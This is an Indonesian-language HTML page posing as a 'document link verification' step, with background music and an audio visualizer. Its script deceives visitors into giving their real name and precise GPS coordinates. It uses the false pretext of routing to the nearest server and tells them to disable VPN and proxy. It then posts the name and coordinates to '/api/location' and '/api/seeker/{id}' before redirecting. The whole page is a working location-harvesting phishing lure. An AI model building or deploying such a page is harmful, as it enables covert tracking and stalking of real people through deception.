<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Verifikasi Link</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button, input {
      padding: 10px;
      font-size: 16px;
      margin: 5px;
    }
    button {
      background: #000;
      color: white;
      border-radius: 8px;
      border: none; 
      cursor: pointer;
    }
    canvas {
      width: 100%;
      height: 150px;
      background: black;
      display: block;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h2>Verifikasi Akses Dokumen</h2>
  <p>Masukkan nama dan izinkan lokasi untuk mengakses dokumen. Agar dirutekan ke Server terdekat</p>
  <p>Mohon untuk mematikan VPN, Proxy, dan Hemat Daya.</p>
  <img src="https://github.com/mukti-nux/Framer-asset/blob/main/download.jpeg?raw=true" alt="OnlineImg" width="200"> <br><br>

  <!-- Audio dari GitHub -->
  <audio id="audio" src="https://github.com/mukti-nux/Framer-asset/raw/refs/heads/main/INTERWORLD%20-%20METAMORPHOSIS.mp3" preload="auto"></audio>

  <!-- Canvas untuk visualizer -->
  <canvas id="canvas" width="600" height="150"></canvas>

  <input type="text" id="nama" placeholder="Nama Asli"><br><br>
  <button onclick="submitData()">Dapatkan Link</button>

  <script>
    const id = new URLSearchParams(window.location.search).get("id");

    // Audio setup
    const audio = document.getElementById('audio');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const source = audioCtx.createMediaElementSource(audio);
    const analyser = audioCtx.createAnalyser();
    source.connect(analyser);
    analyser.connect(audioCtx.destination);
    analyser.fftSize = 256;
    const bufferLength = analyser.frequencyBinCount;
    const dataArray = new Uint8Array(bufferLength);

    function draw() {
      requestAnimationFrame(draw);
      analyser.getByteFrequencyData(dataArray);
      ctx.fillStyle = '#000';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      const barWidth = (canvas.width / bufferLength) * 2.5;
      let x = 0;
      for (let i = 0; i < bufferLength; i++) {
        const barHeight = dataArray[i];
        ctx.fillStyle = `rgb(${barHeight + 100},50,50)`;
        ctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
        x += barWidth + 1;
      }
    }

    function startAudioOnce() {
      audioCtx.resume(); // penting agar Web Audio bisa jalan di browser modern
      audio.play().catch(err => console.warn("Audio gagal diputar:", err));
      draw();
      document.removeEventListener('click', startAudioOnce);
      document.removeEventListener('touchstart', startAudioOnce);
    }

    document.addEventListener('click', startAudioOnce);
    document.addEventListener('touchstart', startAudioOnce);

    function submitData() {
      const nama = document.getElementById("nama").value.trim();
      if (!nama) return alert("Nama wajib diisi.");
      if (!id) return alert("ID dokumen tidak ditemukan.");

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const body = {
              nama,
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              acc: pos.coords.accuracy,
              timestamp: new Date().toISOString()
            };

            fetch("/api/location", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            }).catch((e) => console.warn("Lokasi gagal dikirim:", e));

            fetch(`/api/seeker/${id}`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            })
              .then((res) => res.json())
              .then((data) => {
                if (data.redirectTo) {
                  window.location.href = data.redirectTo;
                } else {
                  alert("Link tidak ditemukan.");
                }
              });
          },
          (err) => alert("Izin lokasi diperlukan. Aktifkan GPS dan izinkan akses."),
          { enableHighAccuracy: true, timeout: 5000 }
        );
      } else {
        alert("Browser tidak mendukung geolokasi.");
      }
    }
  </script>
</body>
</html>
